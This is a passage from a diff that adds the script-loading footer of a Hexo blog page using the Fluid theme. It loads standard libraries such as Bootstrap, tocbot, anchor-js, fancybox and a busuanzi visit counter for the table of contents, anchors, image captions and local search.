+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
